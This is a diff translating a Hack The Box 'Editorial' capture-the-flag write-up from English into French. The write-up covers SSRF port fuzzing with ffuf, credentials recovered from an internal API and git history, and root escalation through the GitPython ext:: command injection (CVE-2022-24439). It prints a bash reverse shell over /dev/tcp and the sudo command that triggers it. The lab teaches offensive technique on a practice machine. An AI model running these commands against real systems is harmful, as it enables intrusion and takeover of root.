@@ -10,13 +10,13 @@ categories = ['Writeups']
 
 * Platforme: Hack The Box
 * Lien: [Editorial](https://app.hackthebox.com/machines/Editorial)
-* Niveau: Easy
+* Niveau: Facile
 * OS: Linux
 ---
 
-Editorial is an easy Linux machine with a few interesting challenges. The web application is vulnerable to Server-Side Request Forgery (SSRF), but it requires fuzzing internal ports to uncover sensitive data. By exploiting an API endpoint, we retrieve credentials that grant initial access to the system. During further enumeration, we discover a series of Git commits, one of which exposes credentials for another user, enabling lateral movement. Privilege escalation is achieved by exploiting CVE-2022-24439 in combination with a root-executable script, leading to root access.
+Editorial est une machine Linux assez simple, mais qui présente quelques particularités. L'application web est vulnérable au Server-Side Request Forgery (SSRF), mais elle nécessite un fuzzing des ports internes pour découvrir des données sensibles. En exploitant un point de terminaison API, nous récupérons des identifiants qui nous donnent un accès initial au système. Au cours d'une énumération plus poussée, nous découvrons une série de commits Git, dont l'un expose les informations d'identification d'un autre utilisateur, ce qui permet un déplacement latéral. L'escalade des privilèges est réalisée en exploitant le CVE-2022-24439 en combinaison avec un script exécutable en tant que root.
 
-IP Addresse cible - `10.10.11.20`
+Addresse IP cible - `10.10.11.20`
 
 ## Balayage
 
@@ -24,7 +24,7 @@ IP Addresse cible - `10.10.11.20`
 ./nmap_scan.sh 10.10.11.20 Editorial
 ```
 
-**Results**
+**Resultats**
 
 ```shell
 Running detailed scan on open ports: 22,80
@@ -46,7 +46,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds
 ```
 
-Two open ports are found 22 (SSH) and 80 (HTTP), additionally there is a redirection to `editorial.htb`.
+Nmap trouve deux ports ouverts, 22 (SSH) et 80 (HTTP), de plus il y a une redirection vers `editorial.htb`.
 
 ```
 sudo echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts
@@ -54,41 +54,41 @@ sudo echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts
 
 ## Enumération
 
-On `http://editorial.htb` we find a website for a publishing company.
+Sur `http://editorial.htb`, nous trouvons le site web d'une maison d'édition.
 
 ![Editorial website](/images/HTB-Editorial/Editorial_website.png)
 
-We get to `http://editorial.htb/upload` after clicking `Publish with Us`. We can either send a link or upload a file.
+En cliquant sur `Publish with Us`, nous accédons à `http://editorial.htb/upload`, où nous pouvons soit envoyer un lien, soit télécharger un fichier.
 
 ![Editorial Publish with Us page](/images/HTB-Editorial/editorial_upload_feature.png)
 
-Since the application accepts a user provided url let's test for SSRF. After filling the form we capture the request from clicking on the `Preview` button.
+Puisque l'application accepte une url fournie par l'utilisateur, testons le SSRF. Une fois le formulaire rempli, nous capturons la requête obtenue après avoir cliqué sur le bouton `Preview`.
 
 ![Editorial upload-cover request](/images/HTB-Editorial/Upload_Cover_Req.png)
 
-We send the request and get a valid response (**Status Code 200OK**), the server header (**nginx/1.18.0 (Ubuntu)**), and some content at `/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg` most likely from some internal application. This means that the SSRF is working, as the application is fetching and returning content from the internal service at `127.0.0.1:80`.
+Nous envoyons la requête et obtenons une réponse valide (**Status Code 200OK**), le header du serveur (**nginx/1.18.0 (Ubuntu)**), et un contenu à `/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg` provenant très probablement d'une application interne. Cela signifie que le SSRF fonctionne, car l'application récupère et renvoie le contenu du service interne à `127.0.0.1:80`.
 
 ![Editorial upload-cover request response](/images/HTB-Editorial/Upload_Cover_response.png)
 
-Another test would be to use our own IP address with a port number of our choosing with a listener set up on that same port.
+Un autre test consisterait à utiliser notre propre adresse IP avec un numéro de port de notre choix, nous aurons également un listener qui écoutera sur ce même port.
 
 ![SSRF test on local Kali](/images/HTB-Editorial/SSRF_test.png)
 
-On the listener we get a response, also confirming the SSRF presence.
+Sur le listener, nous recevons une réponse qui confirme également la présence du SSRF.
 
 ![SSRF local test nc response](/images/HTB-Editorial/SSRF_nc_connection.png)
 
-Checking the content of the response with `http://editorial.htb/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg`, we see a banal picture.
+En examinant le contenu de la réponse avec `http://editorial.htb/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg`, nous observons une image banale.
 
 ![Editorial SSRF response content](/images/HTB-Editorial/response_content.png)
 
-We are on the right track but we are missing something. Most of the time internal applications run on a different port that is not exposed to the public. In order to find the correct one we will do some fuzzing.
+Nous sommes sur la bonne voie, mais il nous manque un élément. La plupart du temps, les applications internes fonctionnent sur un port différent qui n'est pas exposé au public. Afin de trouver le bon port, nous effectuerons un peu de fuzzing.
 
-I use the request in Burp, format it as much as I can and remove the redundant headers.
+J'utilise la requête que nous avons interceptée avec Burp plus tôt, je la formate autant que possible et je supprime les headers redondants.
 
-By using it with ffuf we find the port `5000`.
+En l'utilisant avec ffuf, nous trouvons le port `5000`.
 
-> You could do it with Burp, but keep in mind that the free version rate limit the Intruder feature, so fuzzing all the ports would take you a long time! Ffuf does it in less than 4 minutes which is better in my opinion.
+> Cette opération peut être répliquée avec la fonction Intruder de Burp, mais gardez à l'esprit que la version gratuite limite cette fonction, donc fuzzer tous les ports vous prendrait beaucoup de temps! Ffuf le fait en moins de 4 minutes, ce qui nous fait gagner beaucoup de temps.
 
 ```
 ffuf -u 'http://editorial.htb/upload-cover' \
@@ -106,33 +106,33 @@ ffuf -u 'http://editorial.htb/upload-cover' \
 
 | Option | Description                                                                                 |
 | ------ | ------------------------------------------------------------------------------------------- |
-| -u     | Specifies the target URL                                                                    |
-| -d $   | Specify the HTTP request body                                                               |
-| -w     | Wordlist (we are using a dynamically generated list for all the port numbers)               |
-| FUZZ   | This string will be replaced with each number during the fuzzing process                    |
-| -H     | Specify the HTTP header                                                                     |
-| -t 100 | Sets the number of concurrent threads                                                       |
-| -mc    | Specifies which HTTP response status code to filter                                         |
-| all    | When used, ffuf will not filter responses based on status codes and will show all responses |
-| -fs 61 | Filter by response size. Here, responses with a body size of 61 bytes will be filtered out  |
+| -u     | Spécifie l'URL cible                                                                   |
+| -d $   | Spécifie le corps de la requête HTTP                                                            |
+| -w     | Wordlist (nous utilisons une liste générée de manière dynamique pour tous les numéros de port)               |
+| FUZZ   | Ce texte sera remplacé par chaque nombre au cours du processus de fuzzing                    |
+| -H     | Spécifie l'en-tête HTTP                                                                      |
+| -t 100 | Définit le nombre de threads simultanés                                                      |
+| -mc    | Spécifie le code d'état de la réponse HTTP à filtrer                                         |
+| all    | Si elle est utilisée, ffuf ne filtrera pas les réponses sur la base des codes d'état et affichera toutes les réponses |
+| -fs 61 | Filtre en fonction de la taille de la réponse. Ici, les réponses dont la taille du corps est de 61 octets seront filtrées |
 
 ![SSRF Internal port 5000 found](/images/HTB-Editorial/internal_port_5000_found.png)
 
 ## Accès initial
 
-Now we re-send the request with `http://127.0.0.1:5000` and get a different directory (`uploads`).
+Maintenant, nous renvoyons la requête avec `http://127.0.0.1:5000` et obtenons un répertoire différent (`uploads`).
 
 ![SSRF Internal port number request](/images/HTB-Editorial/SSRF_internal_port_number.png)
 
-When we go to `http://editorial.htb/static/uploads/e9ed8f81-925d-40e0-945e-7fcb30899573` a file gets automatically downloaded on our machine.
+Lorsque nous allons sur `http://editorial.htb/static/uploads/e9ed8f81-925d-40e0-945e-7fcb30899573`, un fichier est automatiquement téléchargé sur notre machine.
 
 ![SSRF File Downloaded](/images/HTB-Editorial/File_Downloaded.png)
 
-It contains some JSON data.
+Il contient des données JSON.
 
 ![JSON Data ugly](/images/HTB-Editorial/JSON_data_ugly.png)
 
-With `jq` we can make it easier to read.
+Avec `jq` nous pouvons le rendre plus lisible.
 
 ```
 cat e9ed8f81-925d-40e0-945e-7fcb30899573 | jq
@@ -140,7 +140,7 @@ cat e9ed8f81-925d-40e0-945e-7fcb30899573 | jq
 
 ![JSON Data pretty](/images/HTB-Editorial/JSON_data_pretty.png)
 
-This is a list of api endpoints.
+Il s'agit d'une liste de points d'accès à l'API.
 
 ```JSON
 {
@@ -193,33 +193,31 @@ This is a list of api endpoints.
 }
 ```
 
-After testing them, the response we get from `http://127.0.0.1:5000/api/latest/metadata/messages/authors` triggers another file download at `http://editorial.htb/static/uploads/c1c51caa-8a20-4f95-aca1-3a55e0a0fb69`.
-
-> Those numbers are dynamically generated so yours will be different.
+Après les avoir testés, la réponse que nous obtenons avec `http://127.0.0.1:5000/api/latest/metadata/messages/authors` déclenche un autre téléchargement de fichier à `http://editorial.htb/static/uploads/c1c51caa-8a20-4f95-aca1-3a55e0a0fb69`.
 
 ![message authors api endpoint](/images/HTB-Editorial/message_authors_api_endpoint.png)
 
 ![message authors api endpoint file downloaded](/images/HTB-Editorial/message_authors_file.png)
 
-It is a welcome message for an author with their credentials, `dev:dev080217_devAPI!@`.
+Il s'agit d'un message de bienvenue pour un auteur avec ses identifiants, `dev:dev080217_devAPI!@`.
 
 ![dev credentials](/images/HTB-Editorial/dev_credentials.png)
 
-Using those credentials we login via SSH, and recover the user flag.
+En utilisant ces identifiants, nous nous connectons via SSH et récupérons le drapeau utilisateur.
 
 ![dev shell and user flag](/images/HTB-Editorial/user_flag_editorial.png)
 
 ### Mouvement latéral (Shell en tant que prod)
 
-In `/home/dev/apps` we find a `.git` directory.
+Dans `/home/dev/apps` nous trouvons un répertoire `.git`.
 
 ![.git file](/images/HTB-Editorial/git-file.png)
 
-Running `git log` inside it brings a list of commits.
+L'exécution de `git log` à l'intérieur de ce dernier permet d'obtenir une liste de commits.
 
 ![git log command](/images/HTB-Editorial/git_log.png)
 
-After using `git show` on the third commit from the top we find another set of credentials, `prod:080217_Producti0n_2023!@`.
+Après avoir utilisé `git show` sur le troisième commit en partant du haut, nous trouvons d'autres informations d'identification, `prod:080217_Producti0n_2023!@`.
 
 ```
 git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
@@ -227,31 +225,31 @@ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
 
 ![prod user credentials](/images/HTB-Editorial/prod_creds.png)
 
-With them we get another SSH shell as `prod`, this user home directory does not hold anything special. 
+Avec ces derniers, nous obtenons un autre shell SSH sous le nom de `prod`, le répertoire personnel de cet utilisateur ne contient rien de spécial.
 
-However he is allowed to run the command `/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py` with any arguments (`*`) as the root user. The `*` is a wildcard that allows any arguments to be passed to the script.
+Cependant, il est autorisé à exécuter la commande `/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py` avec n'importe quel argument (`*`) en tant qu'utilisateur root.
 
 ![sudo -l command](/images/HTB-Editorial/sudo-l_cmd.png)
 
-Let's check the content of `/opt/internal_apps/clone_changes/clone_prod_change.py`
+Examinons le contenu de `/opt/internal_apps/clone_changes/clone_prod_change.py`.
 
 ![clone_prod_change python script](/images/HTB-Editorial/clone_prod_change_script.png)
 
-This script clones a Git repository into a specific directory (`/opt/internal_apps/clone_changes`). The option `multi_options=["-c protocol.ext.allow=always"]` allows the `ext::` protocol to be used for cloning.
+Ce script clone un répertoire Git dans un répertoire spécifique (`/opt/internal_apps/clone_changes`). L'option `multi_options=["-c protocol.ext.allow=always"]` permet au protocole `ext::` d'être utilisé pour le clonage.
 
 ## Elévation de Privilèges
 
-Using `pip3 list` we find the list of all Python packages installed on the system. `GitPython` immidiately stands out, it is running version `3.1.29`.
+En utilisant `pip3 list` nous trouvons la liste de tous les paquets Python installés sur le système. `GitPython` se démarque immédiatement, il utilise la version `3.1.29`.
 
 ![installed python packages list](/images/HTB-Editorial/python_pkg_list.png)
 
-Researching about vulnerabilities for this version we find [CVE-2022-24439](https://github.com/PyCQA/bandit/issues/971) with a PoC [here](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858).
+Des recherches sur les vulnérabilités de cette version nous permettent de trouver le [CVE-2022-24439](https://github.com/PyCQA/bandit/issues/971) avec un PoC [ici](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858).
 
-The exploit leverages the `ext::` protocol in Git which allows users to use external commands instead of standard protocol such as `https` and `ssh`, with this we can achieve a command injection.
+Le code exploite le protocole `ext::` de Git qui permet aux utilisateurs de passer des commandes externes au lieu des protocoles standards tels que `https` et `ssh`, ce qui permet de réaliser une injection de commande.
 
-Let's use a bash script in order to get a reverse shell as `root`.
+Utilisons un script bash afin d'obtenir un shell inversé en tant que `root`.
 
-We create `revshell.sh` and make it executable with `chmod +x revshell.sh`
+Nous créons `revshell.sh` et le rendons exécutable avec `chmod +x revshell.sh`.
 
 ```bash
 #!/bin/bash
@@ -262,7 +260,7 @@ PORT="PORT_NUMBER"
 /bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1
 ```
 
-Then we run the command below to get a root shell on our listener enabling us to read the root flag in `/root`.
+Ensuite, nous exécutons la commande ci-dessous pour obtenir un shell root sur notre listener, ce qui nous permet de lire le drapeau root dans `/root`.
 
 ```
 sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::/tmp/revshell.sh'
@@ -272,7 +270,7 @@ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext
 
 ![Editorial root flag](/images/HTB-Editorial/root_flag_editorial.png)
 
-I appreciate you taking the time to read this write up, keep learning!
+Ce défi était assez simple, du moment que vous étiez minutieux dans votre énumération. Merci d'avoir pris le temps de lire cet article et portez vous bien!
 
 
 
